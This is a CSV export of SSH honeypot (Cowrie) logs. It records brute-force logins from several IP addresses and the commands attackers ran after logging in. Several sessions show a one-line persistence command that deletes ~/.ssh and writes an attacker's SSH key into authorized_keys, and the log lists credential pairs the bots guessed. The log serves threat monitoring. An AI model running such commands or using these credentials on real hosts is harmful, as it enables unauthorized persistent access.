eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.client.kex,121.14.12.136,,,,ba24ad90ec32,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:33:54.966236Z
cowrie.login.success,121.14.12.136,,,,ba24ad90ec32,,,,,login attempt [root/1QAZxsw2!@] succeeded,localhost,2024-10-06T19:33:55.618317Z
cowrie.session.params,121.14.12.136,,,,ba24ad90ec32,,,,,[],localhost,2024-10-06T19:33:55.972188Z
cowrie.command.input,121.14.12.136,,,,ba24ad90ec32,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-10-06T19:33:55.972581Z
cowrie.command.failed,121.14.12.136,,,,ba24ad90ec32,,,,,Command not found: lockr -ia .ssh,localhost,2024-10-06T19:33:55.973277Z
cowrie.log.closed,121.14.12.136,,,,ba24ad90ec32,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-10-06T19:33:56.337667Z
cowrie.session.params,121.14.12.136,,,,ba24ad90ec32,,,,,[],localhost,2024-10-06T19:33:56.542150Z
cowrie.command.input,121.14.12.136,,,,ba24ad90ec32,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-10-06T19:33:56.542558Z
cowrie.session.file_download,121.14.12.136,,,,ba24ad90ec32,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-10-06T19:33:56.706890Z
cowrie.log.closed,121.14.12.136,,,,ba24ad90ec32,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-10-06T19:33:56.707795Z
cowrie.session.connect,121.14.12.136,42924,172.233.154.19,2222,c5a979e6f4d0,ssh,,,,New connection: 121.14.12.136:42924 (172.233.154.19:2222) [session: c5a979e6f4d0],localhost,2024-10-06T19:33:56.851603Z
cowrie.client.version,121.14.12.136,,,,c5a979e6f4d0,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:33:56.853885Z
cowrie.client.kex,121.14.12.136,,,,c5a979e6f4d0,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:33:57.011180Z
cowrie.login.failed,121.14.12.136,,,,c5a979e6f4d0,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-10-06T19:33:57.634024Z
cowrie.session.closed,121.14.12.136,,,,c5a979e6f4d0,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:33:58.791998Z
cowrie.session.connect,121.14.12.136,43550,172.233.154.19,2222,053d41225a6a,ssh,,,,New connection: 121.14.12.136:43550 (172.233.154.19:2222) [session: 053d41225a6a],localhost,2024-10-06T19:33:58.974820Z
cowrie.client.version,121.14.12.136,,,,053d41225a6a,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:33:58.975444Z
cowrie.client.kex,121.14.12.136,,,,053d41225a6a,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:33:59.151965Z
cowrie.login.success,121.14.12.136,,,,053d41225a6a,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-10-06T19:33:59.878745Z
cowrie.session.closed,121.14.12.136,,,,ba24ad90ec32,,,,,Connection lost after 5 seconds,localhost,2024-10-06T19:34:00.042678Z
cowrie.session.closed,121.14.12.136,,,,053d41225a6a,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:34:00.049352Z
cowrie.session.connect,185.81.30.83,39844,172.233.154.19,2222,837939be14a6,ssh,,,,New connection: 185.81.30.83:39844 (172.233.154.19:2222) [session: 837939be14a6],localhost,2024-10-06T19:34:14.780564Z
cowrie.client.version,185.81.30.83,,,,837939be14a6,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:34:14.790999Z
cowrie.client.kex,185.81.30.83,,,,837939be14a6,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:34:14.841217Z
cowrie.login.success,185.81.30.83,,,,837939be14a6,,,,,login attempt [root/qqq123...] succeeded,localhost,2024-10-06T19:34:15.097200Z
cowrie.session.params,185.81.30.83,,,,837939be14a6,,,,,[],localhost,2024-10-06T19:34:15.217106Z
cowrie.command.input,185.81.30.83,,,,837939be14a6,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-10-06T19:34:15.217504Z
cowrie.command.failed,185.81.30.83,,,,837939be14a6,,,,,Command not found: lockr -ia .ssh,localhost,2024-10-06T19:34:15.218191Z
cowrie.log.closed,185.81.30.83,,,,837939be14a6,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-10-06T19:34:15.368499Z
cowrie.session.params,185.81.30.83,,,,837939be14a6,,,,,[],localhost,2024-10-06T19:34:15.446440Z
cowrie.command.input,185.81.30.83,,,,837939be14a6,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-10-06T19:34:15.446816Z
cowrie.session.file_download,185.81.30.83,,,,837939be14a6,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-10-06T19:34:15.491602Z
cowrie.log.closed,185.81.30.83,,,,837939be14a6,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-10-06T19:34:15.492178Z
cowrie.session.connect,185.81.30.83,39856,172.233.154.19,2222,78d52916241a,ssh,,,,New connection: 185.81.30.83:39856 (172.233.154.19:2222) [session: 78d52916241a],localhost,2024-10-06T19:34:15.537063Z
cowrie.client.version,185.81.30.83,,,,78d52916241a,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:34:15.548273Z
cowrie.client.kex,185.81.30.83,,,,78d52916241a,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:34:15.594405Z
cowrie.login.failed,185.81.30.83,,,,78d52916241a,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-10-06T19:34:15.815879Z
cowrie.session.connect,14.225.210.238,44956,172.233.154.19,2222,982a31c9cedd,ssh,,,,New connection: 14.225.210.238:44956 (172.233.154.19:2222) [session: 982a31c9cedd],localhost,2024-10-06T19:34:15.927944Z
cowrie.client.version,14.225.210.238,,,,982a31c9cedd,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:34:15.929174Z
cowrie.client.kex,14.225.210.238,,,,982a31c9cedd,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:34:16.132777Z
cowrie.session.closed,185.81.30.83,,,,78d52916241a,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:34:16.860917Z
cowrie.session.connect,185.81.30.83,54020,172.233.154.19,2222,e7df7bf44475,ssh,,,,New connection: 185.81.30.83:54020 (172.233.154.19:2222) [session: e7df7bf44475],localhost,2024-10-06T19:34:16.904361Z
cowrie.client.version,185.81.30.83,,,,e7df7bf44475,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:34:16.912540Z
cowrie.login.failed,14.225.210.238,,,,982a31c9cedd,,,,,login attempt [dev/dev@2024] failed,localhost,2024-10-06T19:34:16.948415Z
cowrie.client.kex,185.81.30.83,,,,e7df7bf44475,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:34:16.955175Z
cowrie.login.success,185.81.30.83,,,,e7df7bf44475,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-10-06T19:34:17.197381Z
cowrie.session.closed,185.81.30.83,,,,837939be14a6,,,,,Connection lost after 2 seconds,localhost,2024-10-06T19:34:17.250922Z
cowrie.session.closed,185.81.30.83,,,,e7df7bf44475,,,,,Connection lost after 0 seconds,localhost,2024-10-06T19:34:17.251775Z
cowrie.session.closed,14.225.210.238,,,,982a31c9cedd,,,,,Connection lost after 2 seconds,localhost,2024-10-06T19:34:18.154001Z
cowrie.session.connect,101.35.252.142,60066,172.233.154.19,2222,26bc294ac5fe,ssh,,,,New connection: 101.35.252.142:60066 (172.233.154.19:2222) [session: 26bc294ac5fe],localhost,2024-10-06T19:34:37.635844Z
cowrie.client.version,101.35.252.142,,,,26bc294ac5fe,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:34:37.636461Z
cowrie.client.kex,101.35.252.142,,,,26bc294ac5fe,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:34:37.771656Z
cowrie.login.success,101.35.252.142,,,,26bc294ac5fe,,,,,login attempt [root/123456##] succeeded,localhost,2024-10-06T19:34:38.353500Z
cowrie.session.params,101.35.252.142,,,,26bc294ac5fe,,,,,[],localhost,2024-10-06T19:34:38.637902Z
cowrie.command.input,101.35.252.142,,,,26bc294ac5fe,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-10-06T19:34:38.638298Z
cowrie.command.failed,101.35.252.142,,,,26bc294ac5fe,,,,,Command not found: lockr -ia .ssh,localhost,2024-10-06T19:34:38.639004Z
cowrie.session.connect,101.91.162.18,53884,172.233.154.19,2222,912c9c518ca4,ssh,,,,New connection: 101.91.162.18:53884 (172.233.154.19:2222) [session: 912c9c518ca4],localhost,2024-10-06T19:34:38.837166Z
cowrie.client.version,101.91.162.18,,,,912c9c518ca4,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:34:38.838274Z
cowrie.log.closed,101.35.252.142,,,,26bc294ac5fe,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-10-06T19:34:38.950234Z
cowrie.client.kex,101.91.162.18,,,,912c9c518ca4,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:34:38.984677Z
cowrie.session.params,101.35.252.142,,,,26bc294ac5fe,,,,,[],localhost,2024-10-06T19:34:39.136926Z
cowrie.command.input,101.35.252.142,,,,26bc294ac5fe,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-10-06T19:34:39.138735Z
cowrie.session.file_download,101.35.252.142,,,,26bc294ac5fe,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-10-06T19:34:39.279224Z
cowrie.log.closed,101.35.252.142,,,,26bc294ac5fe,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-10-06T19:34:39.279735Z
cowrie.session.connect,101.35.252.142,60704,172.233.154.19,2222,d7f562ffa240,ssh,,,,New connection: 101.35.252.142:60704 (172.233.154.19:2222) [session: d7f562ffa240],localhost,2024-10-06T19:34:39.446344Z
cowrie.client.version,101.35.252.142,,,,d7f562ffa240,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:34:39.447233Z
cowrie.login.failed,101.91.162.18,,,,912c9c518ca4,,,,,login attempt [testuser/testuserpassword] failed,localhost,2024-10-06T19:34:39.583232Z
cowrie.client.kex,101.35.252.142,,,,d7f562ffa240,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:34:39.598294Z
cowrie.login.failed,101.35.252.142,,,,d7f562ffa240,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-10-06T19:34:40.243756Z
cowrie.session.closed,101.91.162.18,,,,912c9c518ca4,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:34:40.730582Z
cowrie.session.closed,101.35.252.142,,,,d7f562ffa240,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:34:41.398046Z
cowrie.session.connect,101.35.252.142,33038,172.233.154.19,2222,456806773865,ssh,,,,New connection: 101.35.252.142:33038 (172.233.154.19:2222) [session: 456806773865],localhost,2024-10-06T19:34:41.518596Z
cowrie.client.version,101.35.252.142,,,,456806773865,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:34:41.519163Z
cowrie.client.kex,101.35.252.142,,,,456806773865,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:34:41.655351Z
cowrie.login.success,101.35.252.142,,,,456806773865,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-10-06T19:34:42.241420Z
cowrie.session.closed,101.35.252.142,,,,26bc294ac5fe,,,,,Connection lost after 4 seconds,localhost,2024-10-06T19:34:42.377669Z
cowrie.session.closed,101.35.252.142,,,,456806773865,,,,,Connection lost after 0 seconds,localhost,2024-10-06T19:34:42.378656Z
cowrie.session.connect,121.14.12.136,54664,172.233.154.19,2222,91d0d61e3149,ssh,,,,New connection: 121.14.12.136:54664 (172.233.154.19:2222) [session: 91d0d61e3149],localhost,2024-10-06T19:34:43.608825Z
cowrie.client.version,121.14.12.136,,,,91d0d61e3149,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:34:43.609746Z
cowrie.client.kex,121.14.12.136,,,,91d0d61e3149,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:34:43.769845Z
cowrie.login.failed,121.14.12.136,,,,91d0d61e3149,,,,,login attempt [ftpuser/ftpuserpassword] failed,localhost,2024-10-06T19:34:44.406948Z
cowrie.session.closed,121.14.12.136,,,,91d0d61e3149,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:34:45.570217Z
cowrie.session.connect,185.81.30.83,50768,172.233.154.19,2222,2f699c67ecb0,ssh,,,,New connection: 185.81.30.83:50768 (172.233.154.19:2222) [session: 2f699c67ecb0],localhost,2024-10-06T19:34:58.996892Z
cowrie.client.version,185.81.30.83,,,,2f699c67ecb0,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:34:59.010954Z
cowrie.client.kex,185.81.30.83,,,,2f699c67ecb0,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:34:59.064113Z
